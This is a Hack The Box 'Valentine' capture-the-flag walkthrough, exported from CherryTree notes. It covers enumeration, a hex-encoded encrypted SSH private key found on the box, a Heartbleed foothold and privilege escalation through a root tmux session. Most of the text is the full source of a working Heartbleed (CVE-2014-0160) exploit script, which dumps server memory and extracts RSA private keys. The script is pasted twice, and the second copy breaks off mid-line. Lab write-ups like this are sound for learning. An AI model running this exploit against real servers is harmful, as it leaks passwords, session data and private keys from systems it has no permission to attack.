<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>valentine</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#valentine">valentine</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<li><a href="#http">http</a></li>
<ol>
<li><a href="#gobuster">gobuster</a></li>
<ol>
<li><a href="#/index">/index</a></li>
<li><a href="#/dev">/dev</a></li>
<ol>
<li><a href="#hype_key">hype_key</a></li>
<ol>
<li><a href="#hex to ascii">hex to ascii</a></li>
<li><a href="#vi hype_key">vi hype_key</a></li>
</ol>
<li><a href="#notes.txt">notes.txt</a></li>
</ol>
<li><a href="#/encode">/encode</a></li>
<li><a href="#/decode">/decode</a></li>
<li><a href="#/omg">/omg</a></li>
</ol>
</ol>
<li><a href="#initial foothold w/ heartbleed">initial foothold w/ heartbleed</a></li>
<ol>
<li><a href="#Heartbleed concept comic">Heartbleed concept comic</a></li>
<li><a href="#vi heartbleed.py">vi heartbleed.py</a></li>
<ol>
<li><a href="#heartbleed.py sourcecode">heartbleed.py sourcecode</a></li>
</ol>
<li><a href="#run heartbleeed">run heartbleeed</a></li>
<ol>
<li><a href="#usage ">usage </a></li>
<li><a href="#heartbleed.py  -n 20">heartbleed.py <target ip=""> -n 20</target></a></li>
<ol>
<li><a href="#interesting finds">interesting finds</a></li>
<li><a href="#base 64 text">base 64 text</a></li>
</ol>
</ol>
<li><a href="#ssh -i hype_key hype@10.10.10.79">ssh -i hype_key hype@10.10.10.79</a></li>
</ol>
<li><a href="#priv esc">priv esc</a></li>
<ol>
<li><a href="#linux smart enumeration">linux smart enumeration</a></li>
<li><a href="#notes">notes</a></li>
<ol>
<li><a href="#ps -ef | grep root">ps -ef | grep root</a></li>
<li><a href="#log onto root tmux session">log onto root tmux session</a></li>
</ol>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
</body></html><div class="page" id="valentine"><h1><b><u>valentine</u></b></h1><img alt="images/364-1.png" src="images/364-1.png"/><br/><img alt="images/364-2.png" src="images/364-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><img alt="images/416-1.png" src="images/416-1.png"/><br/><span style="color:#24ff00;">Note services<br/></span><span style="color:#ffa500;">OpenSSH 5.9 </span><span style="color:#24ff00;">running </span><span style="color:#ffa500;">ssh</span><span style="color:#24ff00;"> on port 22<br/></span><span style="color:#ffa500;">Apache 2.2.22 </span><span style="color:#24ff00;">running </span><span style="color:#ffa500;">http</span><span style="color:#24ff00;"> on port 80<br/></span><span style="color:#ffa500;">Apache 2.2.22</span><span style="color:#24ff00;"> running </span><span style="color:#ffa500;">https</span><span style="color:#24ff00;"> on port 443<br/></span></div>
<div class="page" id="http"><h1><b><u>http</u></b></h1><span style="color:#24ff00;">For those who don't know, this picture is the same picture used to depict the heartbleed exploit:</span><br/><img alt="images/419-1.png" src="images/419-1.png"/><br/><img alt="images/419-2.png" src="images/419-2.png"/><br/><img alt="images/419-3.png" src="images/419-3.png"/></div>
<div class="page" id="gobuster"><h1><b><u>gobuster</u></b></h1><img alt="images/594-1.png" src="images/594-1.png"/><br/><img alt="images/594-2.png" src="images/594-2.png"/></div>
<div class="page" id="/index"><h1><b><u>/index</u></b></h1><span style="color:#24ff00;">same as homepage </span><br/><img alt="images/600-1.png" src="images/600-1.png"/></div>
<div class="page" id="/dev"><h1><b><u>/dev</u></b></h1><span style="color:#24ff00;">interesting find: directory with interesting files:</span><br/><br/><img alt="images/601-1.png" src="images/601-1.png"/></div>
<div class="page" id="hype_key"><h1><b><u>hype_key</u></b></h1><span style="color:#ffa500;">Hype_Key</span><span style="color:#24ff00;"> is most likely the private key for the user “</span><span style="color:#ffff00;">Hype</span><span style="color:#24ff00;">” because thats the name format private keys usualy follow: </span><span style="color:#ffa500;">name_key </span><span style="color:#24ff00;">for private key and </span><span style="color:#ffa500;">rsa_id </span><span style="color:#24ff00;">for public key<br/><br/><br/>completely unreadable hex code, lets see if we can decode this to something legible:</span><br/><img alt="images/602-1.png" src="images/602-1.png"/></div>
<div class="page" id="hex to ascii"><h1><b><u>hex to ascii</u></b></h1><span style="color:#24ff00;">hex decoded reveals an </span><span style="color:#ffff00;">SSH key</span><span style="color:#24ff00;"> !</span><br/><br/><div class="codebox"><div style="background-color: #001b33 ; padding: 10px; border: 1px solid green;">
-----BEGIN RSA PRIVATE KEY-----<br/>Proc-Type: 4,ENCRYPTED<br/>DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46<br/><br/>DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R<br/>5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6<br/>0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi<br/>Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P<br/>OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd<br/>pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH<br/>QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E<br/>p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC<br/>Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO<br/>t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5<br/>XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK<br/>aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ<br/>+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E<br/>AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q<br/>r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe<br/>2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky<br/>e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP<br/>09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC<br/>dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX<br/>cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY<br/>pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj<br/>Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL<br/>suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW<br/>l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT<br/>RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3<br/>-----END RSA PRIVATE KEY-----</div></div></div>
<div class="page" id="vi hype_key"><h1><b><u>vi hype_key</u></b></h1><span style="color:#24ff00;">lets store this into a key file for future use</span><br/><img alt="images/604-1.png" src="images/604-1.png"/><br/><img alt="images/604-2.png" src="images/604-2.png"/></div>
<div class="page" id="notes.txt"><h1><b><u>notes.txt</u></b></h1><span style="color:#24ff00;">notes that give us some insight on the Dev's agenda and coffee addiction:</span><br/><img alt="images/605-1.png" src="images/605-1.png"/></div>
<div class="page" id="/encode"><h1><b><u>/encode</u></b></h1><span style="color:#24ff00;">Built in encoder, lets test it and see what it encodes the info to </span><br/><br/><img alt="images/530-1.png" src="images/530-1.png"/><br/><br/><span style="color:#24ff00;">As seen here it encodes any string we enter into </span><span style="color:#ffff00;">Base64</span><span style="color:#24ff00;">:</span><br/><img alt="images/530-2.png" src="images/530-2.png"/></div>
<div class="page" id="/decode"><h1><b><u>/decode</u></b></h1><span style="color:#24ff00;">seems to be decoder of some sort, entering leaked data from our heartbleed.py exploit shows it is a base64 decoder:</span><br/><br/><img alt="images/2035-1.png" src="images/2035-1.png"/><br/><span style="color:#ffff00;">heartbleedbelievethehype</span><br/><br/>s<img alt="images/2035-2.png" src="images/2035-2.png"/><br/></div>
<div class="page" id="/omg"><h1><b><u>/omg</u></b></h1><span style="color:#24ff00;">just the picture again</span><br/><img alt="images/2036-1.png" src="images/2036-1.png"/></div>
<div class="page" id="initial foothold w/ heartbleed"><h1><b><u>initial foothold w/ heartbleed</u></b></h1><span style="color:#24ff00;">given the picture of the webpage of the box is heartbleed, its easy to assume we'll be utilizing that exploit for this box</span><br/><br/><br/><img alt="images/39-1.png" src="images/39-1.png"/></div>
<div class="page" id="Heartbleed concept comic"><h1><b><u>Heartbleed concept comic</u></b></h1><span style="color:#24ff00;">Here is a genuinely good explanation on how the </span><span style="color:#ffa500;">heartbleed</span><span style="color:#24ff00;"> exploit works/leaks server information thanks to xkcd</span><br/><img alt="images/2038-1.png" src="images/2038-1.png"/><br/><img alt="images/2038-2.png" src="images/2038-2.png"/></div>
<div class="page" id="vi heartbleed.py"><h1><b><u>vi heartbleed.py</u></b></h1><span style="color:#24ff00;">paste heartbleed.py source code into </span><span style="color:#ffa500;">heartbleed.py</span><span style="color:#24ff00;"> vi file and </span><span style="color:#ffa500;">chmod</span><span style="color:#24ff00;"> it to execute<br/>(maybe move a copy of it into the </span><span style="color:#ffa500;">/opt/</span><span style="color:#24ff00;"> folder for future use)</span><br/><img alt="images/2039-1.png" src="images/2039-1.png"/><br/><br/><br/><br/></div>
<div class="page" id="heartbleed.py sourcecode"><h1><b><u>heartbleed.py sourcecode</u></b></h1><span style="color:#24ff00;">for anyone interested in reading the code or too lazy to download it off the web, feel free to take it from here</span>:<br/><br/><div class="codebox"><div style="background-color: #001b33 ; padding: 10px; border: 1px solid green;">#!/usr/bin/python<br/><br/># Modified by Travis Lee<br/># Last Updated: 4/21/14<br/># Version 1.16<br/>#<br/># -changed output to display text only instead of hexdump and made it easier to read<br/># -added option to specify number of times to connect to server (to get more data)<br/># -added option to send STARTTLS command for use with SMTP/POP/IMAP/FTP/etc... <br/># -added option to specify an input file of multiple hosts, line delimited, with or without a port specified (host:port)<br/># -added option to have verbose output<br/># -added capability to automatically check if STARTTLS/STLS/AUTH TLS is supported when smtp/pop/imap/ftp ports are entered and automatically send appropriate command <br/># -added option for hex output<br/># -added option to output raw data to a file<br/># -added option to output ascii data to a file<br/># -added option to not display returned data on screen (good if doing many iterations and outputting to a file)<br/># -added tls version auto-detection<br/># -added an extract rsa private key mode (orig code from epixoip. will exit script when found and enables -d (do not display returned data on screen)<br/>#  -requires following modules: gmpy, pyasn1<br/><br/># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)<br/># The author disclaims copyright to this source code.<br/><br/>import sys<br/>import struct<br/>import socket<br/>import time<br/>import select<br/>import re<br/>import time<br/>import os<br/>from optparse import OptionParser<br/><br/>options = OptionParser(usage='%prog server [options]', description='Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)')<br/>options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')<br/>options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)')<br/>options.add_option('-s', '--starttls', action="store_true", dest="starttls", help='Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...')<br/>options.add_option('-f', '--filein', type='str', help='Specify input file, line delimited, IPs or hostnames or IP:port or hostname:port')<br/>options.add_option('-v', '--verbose', action="store_true", dest="verbose", help='Enable verbose output')<br/>options.add_option('-x', '--hexdump', action="store_true", dest="hexdump", help='Enable hex output')<br/>options.add_option('-r', '--rawoutfile', type='str', help='Dump the raw memory contents to a file')<br/>options.add_option('-a', '--asciioutfile', type='str', help='Dump the ascii contents to a file')<br/>options.add_option('-d', '--donotdisplay', action="store_true", dest="donotdisplay", help='Do not display returned data on screen')<br/>options.add_option('-e', '--extractkey', action="store_true", dest="extractkey", help='Attempt to extract RSA Private Key, will exit when found. Choosing this enables -d, do not display returned data on screen.')<br/><br/>opts, args = options.parse_args()<br/><br/>if opts.extractkey:<br/>    import base64, gmpy<br/>    from pyasn1.codec.der import encoder<br/>    from pyasn1.type.univ import *<br/><br/>def hex2bin(arr):<br/>    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')<br/><br/>tls_versions = {0x01:'TLSv1.0',0x02:'TLSv1.1',0x03:'TLSv1.2'}<br/><br/>def build_client_hello(tls_ver):<br/>    client_hello = [<br/># TLS header ( 5 bytes)<br/>0x16,               # Content type (0x16 for handshake)<br/>0x03, tls_ver,         # TLS Version<br/>0x00, 0xdc,         # Length<br/># Handshake header<br/>0x01,               # Type (0x01 for ClientHello)<br/>0x00, 0x00, 0xd8,   # Length<br/>0x03, tls_ver,         # TLS Version<br/># Random (32 byte)<br/>0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,<br/>0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,<br/>0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,<br/>0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,<br/>0x00,               # Session ID length<br/>0x00, 0x66,         # Cipher suites length<br/># Cipher suites (51 suites)<br/>0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,<br/>0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,<br/>0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,<br/>0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,<br/>0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,<br/>0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,<br/>0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,<br/>0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,<br/>0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,<br/>0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,<br/>0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,<br/>0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,<br/>0x00, 0x06, 0x00, 0x03, 0x00, 0xff,<br/>0x01,               # Compression methods length<br/>0x00,               # Compression method (0x00 for NULL)<br/>0x00, 0x49,         # Extensions length<br/># Extension: ec_point_formats<br/>0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,<br/># Extension: elliptic_curves<br/>0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,<br/>0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,<br/>0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,<br/>0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,<br/>0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,<br/>0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,<br/>0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,<br/># Extension: SessionTicket TLS<br/>0x00, 0x23, 0x00, 0x00,<br/># Extension: Heartbeat<br/>0x00, 0x0f, 0x00, 0x01, 0x01<br/>    ]<br/>    return client_hello<br/> <br/>def build_heartbeat(tls_ver):<br/>    heartbeat = [<br/>0x18,       # Content Type (Heartbeat)<br/>0x03, tls_ver,  # TLS version<br/>0x00, 0x03,  # Length<br/># Payload<br/>0x01,       # Type (Request)<br/>0x40, 0x00  # Payload length<br/>    ] <br/>    return heartbeat<br/><br/><br/>if opts.rawoutfile:<br/>    rawfileOUT = open(opts.rawoutfile, "a")<br/><br/>if opts.asciioutfile:<br/>    asciifileOUT = open(opts.asciioutfile, "a")<br/> <br/>if opts.extractkey:<br/>    opts.donotdisplay = True<br/> <br/>def hexdump(s):<br/>    pdat = ''<br/>    hexd = ''<br/>    for b in xrange(0, len(s), 16):<br/>        lin = [c for c in s[b : b + 16]]<br/>        if opts.hexdump:<br/>            hxdat = ' '.join('%02X' % ord(c) for c in lin)<br/>            pdat = ''.join((c if 32 &lt;= ord(c) &lt;= 126 else '.' )for c in lin)<br/>            hexd += '  %04x: %-48s %s\n' % (b, hxdat, pdat)<br/>        else:<br/>            pdat += ''.join((c if ((32 &lt;= ord(c) &lt;= 126) or (ord(c) == 10) or (ord(c) == 13)) else '.' )for c in lin)<br/>    if opts.hexdump:<br/>	    return hexd<br/>    else:<br/>        pdat = re.sub(r'([.]{50,})', '', pdat)<br/>        if opts.asciioutfile:<br/>            asciifileOUT.write(pdat)<br/>        return pdat<br/><br/>def rcv_tls_record(s):<br/>    try:<br/>        tls_header = s.recv(5)<br/>        if not tls_header:<br/>            print 'Unexpected EOF (header)' <br/>            return None,None,None        <br/>        typ,ver,length = struct.unpack('&gt;BHH',tls_header)<br/>        message = ''<br/>        while len(message) != length:<br/>            message += s.recv(length-len(message))<br/>        if not message:<br/>            print 'Unexpected EOF (message)'<br/>            return None,None,None<br/>        if opts.verbose:<br/>	        print 'Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,)<br/>        return typ,ver,message<br/>    except Exception as e:<br/>        print "\nError Receiving Record! " + str(e)<br/>        return None,None,None<br/><br/>def hit_hb(s, targ, firstrun, supported):<br/>    s.send(hex2bin(build_heartbeat(supported)))<br/>    while True:<br/>        typ, ver, pay = rcv_tls_record(s)<br/>        if typ is None:<br/>            print 'No heartbeat response received, server likely not vulnerable'<br/>            return ''<br/><br/>        if typ == 24:<br/>            if opts.verbose:<br/>                print 'Received heartbeat response...'<br/>            if len(pay) &gt; 3:<br/>                if firstrun or opts.verbose:<br/>                    print '\nWARNING: ' + targ + ':' + str(opts.port) + ' returned more data than it should - server is vulnerable!'<br/>                if opts.rawoutfile:<br/>                    rawfileOUT.write(pay)<br/>                if opts.extractkey:<br/>                	return pay<br/>                else:<br/>	                return hexdump(pay)<br/>            else:<br/>                print 'Server processed malformed heartbeat, but did not return any extra data.'<br/><br/>        if typ == 21:<br/>            print 'Received alert:'<br/>            return hexdump(pay)<br/>            print 'Server returned error, likely not vulnerable'<br/>            return ''<br/><br/><br/>def conn(targ, port):<br/>    try:<br/>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>        sys.stdout.flush()<br/>        s.settimeout(10)<br/>        #time.sleep(0.2)<br/>        s.connect((targ, port))<br/>        return s<br/><br/>    except Exception as e:<br/>       print "Connection Error! " + str(e)<br/>       return None<br/> <br/>def bleed(targ, port):<br/>    try:<br/>        res = ''<br/>        firstrun = True<br/>        print '\n##################################################################'<br/>        print 'Connecting to: ' + targ + ':' + str(port) + ', ' + str(opts.num) + ' times'<br/>        for x in range(0, opts.num):<br/>            if x &gt; 0:<br/>                firstrun = False<br/> <br/>            if x == 0 and opts.extractkey:<br/>                print "Attempting to extract private key from returned data..."<br/>                if not os.path.exists('./hb-certs'):<br/>                    os.makedirs('./hb-certs')<br/>                print '\nGrabbing public cert from: ' + targ + ':' + str(port) + '\n'<br/>                os.system('echo | openssl s_client -connect ' + targ + ':' + str(port) + ' -showcerts | openssl x509 &gt; hb-certs/sslcert_' + targ + '.pem')	<br/>                print '\nExtracting modulus from cert...\n'<br/>                os.system('openssl x509 -pubkey -noout -in hb-certs/sslcert_' + targ + '.pem &gt; hb-certs/sslcert_' + targ + '_pubkey.pem')<br/>                output = os.popen('openssl x509 -in hb-certs/sslcert_' + targ + '.pem -modulus -noout | cut -d= -f2')<br/>                modulus = output.read()<br/> <br/>            s = conn(targ, port)<br/>            if not s:<br/>                continue<br/><br/>            # send starttls command if specified as an option or if common smtp/pop3/imap ports are used<br/>            if (opts.starttls) or (port in {25, 587, 110, 143, 21}):<br/> <br/>                stls = False<br/>                atls = False<br/> <br/>                # check if smtp supports starttls/stls<br/>                if port in {25, 587}:<br/>                    print 'SMTP Port... Checking for STARTTLS Capability...'<br/>                    check = s.recv(1024)<br/>                    s.send("EHLO someone.org\n")<br/>                    sys.stdout.flush()<br/>                    check += s.recv(1024)<br/>                    if opts.verbose:<br/>                        print check<br/> <br/>                    if "STARTTLS" in check:<br/>                        opts.starttls = True<br/>                        print "STARTTLS command found"<br/>                    elif "STLS" in check:<br/>                        opts.starttls = True<br/>                        stls = True<br/>                        print "STLS command found"<br/>                    else:<br/>                        print "STARTTLS command NOT found!"<br/>                        print '##################################################################'<br/>                        return<br/> <br/>                # check if pop3/imap supports starttls/stls                            <br/>                elif port in {110, 143}:<br/>                    print 'POP3/IMAP4 Port... Checking for STARTTLS Capability...'<br/>                    check = s.recv(1024)<br/>                    if port == 110:<br/>                        s.send("CAPA\n")<br/>                    if port == 143:<br/>                        s.send("CAPABILITY\n")<br/>                    sys.stdout.flush()<br/>                    check += s.recv(1024)<br/>                    if opts.verbose:<br/>                        print check<br/> <br/>                    if "STARTTLS" in check:<br/>                        opts.starttls = True<br/>                        print "STARTTLS command found"<br/>                    elif "STLS" in check:<br/>                        opts.starttls = True<br/>                        stls = True<br/>                        print "STLS command found"<br/>                    else:<br/>                        print "STARTTLS command NOT found!"<br/>                        print '##################################################################'<br/>                        return<br/> <br/>                # check if ftp supports auth tls/starttls                          <br/>                elif port in {21}:<br/>                    print 'FTP Port... Checking for AUTH TLS Capability...'<br/>                    check = s.recv(1024)<br/>                    s.send("FEAT\n")<br/>                    sys.stdout.flush()<br/>                    check += s.recv(1024)<br/>                    if opts.verbose:<br/>                        print check<br/> <br/>                    if "STARTTLS" in check:<br/>                        opts.starttls = True<br/>                        print "STARTTLS command found"<br/>                    elif "AUTH TLS" in check:<br/>                        opts.starttls = True<br/>                        atls = True<br/>                        print "AUTH TLS command found"<br/>                    else:<br/>                        print "STARTTLS command NOT found!"<br/>                        print '##################################################################'<br/>                        return<br/> <br/>                # send appropriate tls command if supported                        <br/>                if opts.starttls:       <br/>                    sys.stdout.flush()<br/>                    if stls:<br/>                        print 'Sending STLS Command...'<br/>                        s.send("STLS\n")<br/>                    elif atls:<br/>                        print 'Sending AUTH TLS Command...'<br/>                        s.send("AUTH TLS\n")<br/>                    else:<br/>                        print 'Sending STARTTLS Command...'<br/>                        s.send("STARTTLS\n")<br/>                    if opts.verbose:<br/>                        print 'Waiting for reply...'<br/>                    sys.stdout.flush()<br/>                    rcv_tls_record(s)<br/><br/>            supported = False<br/>            for num,tlsver in tls_versions.items():<br/> <br/>                if firstrun:<br/>                    print 'Sending Client Hello for {}'.format(tlsver)<br/>                s.send(hex2bin(build_client_hello(num)))<br/> <br/>                if opts.verbose:<br/>                    print 'Waiting for Server Hello...'<br/> <br/>                while True:<br/>                    typ,ver,message = rcv_tls_record(s)<br/>                    if not typ:<br/>                        if opts.verbose:<br/>                            print 'Server closed connection without sending ServerHello for {}'.format(tlsver)<br/>                        s.close()<br/>                        s = conn(targ, port)<br/>                        break<br/>                    if typ == 22 and ord(message[0]) == 0x0E:<br/>                        if firstrun:<br/>                            print 'Received Server Hello for {}'.format(tlsver)<br/>                        supported = True<br/>                        break<br/>                if supported: break<br/><br/>            if not supported:<br/>                print '\nError! No TLS versions supported!'<br/>                print '##################################################################'<br/>                return<br/><br/>            if opts.verbose:<br/>                print '\nSending heartbeat request...'<br/>            sys.stdout.flush()<br/> <br/>            keyfound = False<br/>            if opts.extractkey:<br/>            	res = hit_hb(s, targ, firstrun, supported)<br/>            	if res == '':<br/>            	    continue<br/>            	keyfound = extractkey(targ, res, modulus)<br/>            else:<br/>	            res += hit_hb(s, targ, firstrun, supported)<br/>            s.close()<br/>            if keyfound:<br/>                sys.exit(0)<br/>            else:<br/>                sys.stdout.write('\rPlease wait... connection attempt ' + str(x+1) + ' of ' + str(opts.num))<br/>                sys.stdout.flush()<br/> <br/>        print '\n##################################################################'<br/>        print       <br/>        return res<br/> <br/>    except Exception as e:<br/>       print "Error! " + str(e)<br/>       print '##################################################################'<br/>       print               <br/><br/>def extractkey(host, chunk, modulus):<br/> <br/>    #print "\nChecking for private key...\n"<br/>    n = int (modulus, 16)<br/>    keysize = n.bit_length() / 16<br/><br/>    for offset in xrange (0, len (chunk) - keysize):<br/>        p = long (''.join (["%02x" % ord (chunk[x]) for x in xrange (offset + keysize - 1, offset - 1, -1)]).strip(), 16)<br/>        if gmpy.is_prime (p) and p != n and n % p == 0:<br/>            if opts.verbose:<br/>                print '\n\nFound prime: ' + str(p)<br/>            e = 65537<br/>            q = n / p<br/>            phi = (p - 1) * (q - 1)<br/>            d = gmpy.invert (e, phi)<br/>            dp = d % (p - 1)<br/>            dq = d % (q - 1)<br/>            qinv = gmpy.invert (q, p)<br/>            seq = Sequence()<br/>            for x in [0, n, e, d, p, q, dp, dq, qinv]:<br/>                seq.setComponentByPosition (len (seq), Integer (x))<br/>            print "\n\n-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n\n" % base64.encodestring(encoder.encode (seq))<br/>            privkeydump = open("hb-certs/privkey_" + host + ".dmp", "a")<br/>            privkeydump.write(chunk)<br/>            return True<br/>        else:<br/>            return False<br/><br/>def main():<br/><br/>    print "\ndefribulator v1.16"<br/>    print "A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)"<br/>    allresults = ''<br/> <br/>    # if a file is specified, loop through file<br/>    if opts.filein:<br/>        fileIN = open(opts.filein, "r")<br/> <br/>        for line in fileIN:<br/>            targetinfo = line.strip().split(":")<br/>            if len(targetinfo) &gt; 1:<br/>                allresults = bleed(targetinfo[0], int(targetinfo[1]))<br/>            else:<br/>                allresults = bleed(targetinfo[0], opts.port)<br/> <br/>            if allresults and (not opts.donotdisplay):<br/>                print '%s' % (allresults)<br/><br/>        fileIN.close()<br/><br/>    else:<br/>        if len(args) &lt; 1:<br/>            options.print_help()<br/>            return<br/>        allresults = bleed(args[0], opts.port)<br/>        if allresults and (not opts.donotdisplay):<br/>            print '%s' % (allresults)<br/> <br/>    print<br/> <br/>    if opts.rawoutfile:<br/>        rawfileOUT.close()<br/> <br/>    if opts.asciioutfile:<br/>        asciifileOUT.close()<br/> <br/>if __name__ == '__main__':<br/>    main()<br/>#!/usr/bin/python<br/><br/># Modified by Travis Lee<br/># Last Updated: 4/21/14<br/># Version 1.16<br/>#<br/># -changed output to display text only instead of hexdump and made it easier to read<br/># -added option to specify number of times to connect to server (to get more data)<br/># -added option to send STARTTLS command for use with SMTP/POP/IMAP/FTP/etc... <br/># -added option to specify an input file of multiple hosts, line delimited, with or without a port specified (host:port)<br/># -added option to have verbose output<br/># -added capability to automatically check if STARTTLS/STLS/AUTH TLS is supported when smtp/pop/imap/ftp ports are entered and automatically send appropriate command <br/># -added option for hex output<br/># -added option to output raw data to a file<br/># -added option to output ascii data to a file<br/># -added option to not display returned data on screen (good if doing many iterations and outputting to a file)<br/># -added tls version auto-detection<br/># -added an extract rsa private key mode (orig code from epixoip. will exit script when found and enables -d (do not display returned data on screen)<br/>#  -requires following modules: gmpy, pyasn1<br/><br/># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)<br/># The author disclaims copyright to this source code.<br/><br/>import sys<br/>import struct<br/>import socket<br/>import time<br/>import select<br/>import re<br/>import time<br/>import os<br/>from optparse import OptionParser<br/><br/>options = OptionParser(usage='%prog server [options]', description='Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)')<br/>options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')<br/>options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)')<br/>options.add_option('-s', '--starttls', action="store_true", dest="starttls", help='Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...')<br/>options.add_option('-f', '--filein', type='str', help='Specify input file, line delimited, IPs or hostnames or IP:port or hostname:port')<br/>options.add_option('-v', '--verbose', action="store_true", dest="verbose", help='Enable verbose output')<br/>options.add_option('-x', '--hexdump', action="store_true", dest="hexdump", help='Enable hex output')<br/>options.add_option('-r', '--rawoutfile', type='str', help='Dump the raw memory contents to a file')<br/>options.add_option('-a', '--asciioutfile', type='str', help='Dump the ascii contents to a file')<br/>options.add_option('-d', '--donotdisplay', action="store_true", dest="donotdisplay", help='Do not display returned data on screen')<br/>options.add_option('-e', '--extractkey', action="store_true", dest="extractkey", help='Attempt to extract RSA Private Key, will exit when found. Choosing this enables -d, do not display returned data on screen.')<br/><br/>opts, args = options.parse_args()<br/><br/>if opts.extractkey:<br/>    import base64, gmpy<br/>    from pyasn1.codec.der import 